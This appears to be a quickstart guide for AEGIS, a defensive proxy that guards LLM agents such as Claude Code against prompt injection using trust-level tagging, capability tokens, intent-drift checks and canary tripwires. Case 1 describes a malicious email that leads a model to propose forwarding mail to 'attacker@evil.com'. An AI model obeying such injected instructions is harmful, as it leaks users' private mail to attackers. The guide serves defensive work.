# Quickstart

Three deployment cases. Pick the one that matches your stack.

## The deployment model

```
   Your agent
        │
        ▼
   anthropic.Anthropic(base_url="http://localhost:8080/v1/anthropic")
        │
        ▼
   ┌──────────────────────┐
   │  AEGIS proxy :8080   │ ── 5 layers ── decision log
   └──────────────────────┘
        │
        ▼
   api.anthropic.com
```

Every supported provider's SDK lets you override the base URL. AEGIS speaks each provider's wire format, runs the five layers, and forwards.

---

## Case 1. Anthropic API agent

The clean case. You have a Python or TypeScript agent calling `client.messages.create(...)` with tools defined.

### Run the proxy

```bash
docker run -d \
  --name aegis \
  -p 8080:8080 \
  -e AEGIS_MASTER_KEY="$(openssl rand -hex 32)" \
  -v $(pwd)/aegis-policy.yaml:/etc/aegis/policy.yaml:ro \
  -v aegis-logs:/var/aegis \
  ghcr.io/cwellbournewood/aegis:1.0.0
```

Or with Docker Compose:

```bash
cd deploy
AEGIS_MASTER_KEY=$(openssl rand -hex 32) docker compose up -d
```

### Declare intent and mint capabilities

```python
from aegis.sdk import AegisClient
import anthropic

aegis = AegisClient(base_url="http://localhost:8080")

session = aegis.session.create(
    user_intent="summarize my latest invoices and email me the totals",
    upstream="anthropic",
)

session.capabilities.mint(
    "read_email",
    constraints={"folder": {"kind": "eq", "value": "invoices"}, "limit": {"kind": "max_len", "value": 50}},
)
session.capabilities.mint(
    "send_email",
    constraints={"to": {"kind": "eq", "value": "you@example.com"}},
)

client = anthropic.Anthropic(
    base_url=session.proxy_url,
    api_key="sk-ant-...",
)

resp = client.messages.create(
    model="claude-sonnet-4-5",
    max_tokens=4096,
    tools=[...],
    messages=[{"role": "user", "content": "Pull my invoices and email me the totals."}],
    extra_body={
        "aegis": {
            "session_id": session.session_id,
            "capability_tokens": session.capability_tokens(),
        }
    },
)
```

If the model proposes `set_email_forwarding(to="attacker@evil.com")` because a malicious email body told it to, three layers block it:

- **Lattice**, proposed action's causal origin includes L0 → BLOCK.
- **Capability**, no token minted for `set_email_forwarding` → BLOCK.
- **Intent drift**. "set forwarding" is far from "summarize invoices" → BLOCK.

AEGIS returns HTTP 200 with the offending `tool_use` block rewritten to a structured `aegis_denied` message and a non-empty `text` block summarizing the reason. Whether the agent retries gracefully, surfaces the denial to the user, or aborts is up to the agent loop, AEGIS guarantees the call doesn't reach the upstream side effect.

### Tag retrieval sources correctly

The adapter tags content based on the wire-format slot it arrives in:

| Source | Slot | Tag |
|---|---|---|
| Hardcoded system prompt | `system` | L3 |
| Authenticated user input | `messages[].role == "user"` | L2 |
| Your own RAG / vector store | `tool_result` | L0 (configurable to L1) |
| Web fetch, scraped email, third-party API | `tool_result` | L0 |

If you stuff retrieved content into a `user` message, AEGIS sees it as L2, exactly what the lattice prevents. Use the right wire-format slot.

---

## Case 2. Claude Code

Claude Code itself is an agent, it runs locally and calls Anthropic's API directly using bash, file edits, and MCP servers as its tools. Two paths exist with meaningfully different protection.

### Path A. Proxy interception

Five-minute install. Claude Code respects standard Anthropic env vars.

```bash
docker run -d --name aegis -p 8080:8080 \
  -e AEGIS_MASTER_KEY="$(openssl rand -hex 32)" \
  ghcr.io/cwellbournewood/aegis:1.0.0

export ANTHROPIC_BASE_URL="http://localhost:8080/v1/anthropic"
claude
```

This gets you CCPT, canary tripwires, intent drift, and the audit log. It does not give you meaningful capability-token protection. Claude Code's tools aren't declared upfront against a clear user intent, so the capability layer has nothing to bind to.

### Path B. MCP-server wrapping

```bash
# Instead of:
claude mcp add github "npx @modelcontextprotocol/server-github"

# Wrap it (pair with Path A's running proxy for end-to-end canary coverage):
claude mcp add github "aegis mcp-wrap --proxy-url http://localhost:8080 -- npx @modelcontextprotocol/server-github"
```

What the wrapper does on every MCP message:

| Direction | Inspection | Action on leak |
|---|---|---|
| Agent → server (`tools/call` requests) | Scans `params` for canary leaks | Synthesizes a JSON-RPC error reply; request is **not** forwarded to the server |
| Server → agent (`tools/call` responses) | Scans `result.content` / `result.toolResult` | Replaces the response with a JSON-RPC error before it reaches the agent |
| Server → agent (other) | Optional `_aegis: {origin: tool, level: L0}` annotation | n/a |

`--proxy-url` is the load-bearing flag. With it, the wrapper polls `/aegis/canaries/active` and scans against the same canaries the proxy planted in the LLM's system prompt, that's where canary-leak detection has real security value. Without it, the wrapper still provides L0 boundary tagging and the structural plumbing for the proxy's lattice gate, but its canary scan can only catch echo-back patterns (an MCP server that copies prompt content into responses).

`--policy permissive` switches to log-only: leaks still increment `aegis_mcp_blocks_total{reason="canary_leak_response_permissive"}` but traffic passes through unmodified. Useful for first-week observation.

Use both paths together. Path A gives you traffic-level coverage; Path B closes the MCP-stdio sidechannel.

---

## Case 3. LangGraph, CrewAI, AutoGen, custom

These call Anthropic / OpenAI / Google SDKs under the hood. Deployment is identical to Case 1: set `base_url`, declare intent at the start of each user-facing task, mint capabilities for tools that task should be allowed to use.

The framework-specific question is *where* the intent declaration lives:

| Framework | Where to declare intent |
|---|---|
| **LangGraph** | Graph entry node, before invoking the graph |
| **CrewAI** | Wrap `crew.kickoff()` |
| **AutoGen** | UserProxyAgent's first message handler |
| **Custom** | Your top-level user-request handler |

```python
session = aegis.session.create(user_intent=user_request, upstream="anthropic")
for tool in dangerous_tools_this_request_needs:
    session.capabilities.mint(tool, constraints=tight_constraints_for(tool))
```

Then pass `session.proxy_url` and `session.capability_tokens()` into your framework's Anthropic client configuration.

---

## Starter policy

Drop this at `aegis-policy.yaml` and mount it into the container:

```yaml
mode: balanced  # strict | balanced | permissive

flows:
  - { from: L0, to: tool_call, decision: BLOCK }
  - { from: L1, to: tool_call, decision: WARN, require: [capability_token] }
  - { from: L2, to: tool_call, decision: ALLOW, require: [capability_token] }
  - { from: L3, to: tool_call, decision: ALLOW }

anchor:
  threshold_balanced: 0.22
  threshold_strict: 0.40
  embedder:
    kind: hashing
    dim: 384

canary:
  enabled: true
  count: 3

capability:
  default_ttl_seconds: 600
  nonce_store:
    kind: memory   # or: redis, with url + namespace, for multi-replica HA

log_path: /var/aegis/decisions.log
session_ttl_seconds: 43200
```

Validate before deploying:

```bash
aegis policy validate ./aegis-policy.yaml
```

The two knobs most worth tuning:

- **`mode`**: start in `permissive` for a week. Log everything, block nothing. Review the log to see what *would have been* blocked. Then promote to `balanced`. Move to `strict` only once your false-positive rate is acceptable.
- **Per-tool capability constraints**: tighter constraints (`eq`, `regex`, `prefix`) are stronger defenses than `any`.

---

## Smoke test

```bash
curl http://localhost:8080/aegis/health
docker exec aegis aegis bench --mode balanced
```

Expected: 100% block rate on attack cases, 0% false positives on benign cases.

```bash
curl http://localhost:8080/metrics | grep aegis_requests_total
open http://localhost:8080/aegis/dashboard
```

---

## Common pitfalls

- **AEGIS firing on every read.** Move read-only tools out of `capability.require_for_tools`, or mint long-TTL non-single-use tokens for them at session start.
- **Intent drift blocks legitimate multi-step tasks.** Multi-anchor support widens the anchor on each new user turn automatically. If false positives still appear, lower `threshold_balanced` to 0.18.
- **Capability tokens feel like a hassle.** Mint them at session creation with broad-but-not-wildcard constraints. The point is *some* binding to user intent, not perfect parameter prediction.
- **MCP server tool responses get blocked.** Wrap the server with `aegis mcp-wrap` so the L0-tagging boundary is correct.

---

## Next steps

- [Architecture](ARCHITECTURE.md), how each layer works and how they compose
- [Operator guide](OPERATOR.md), production deployment, tuning, observability
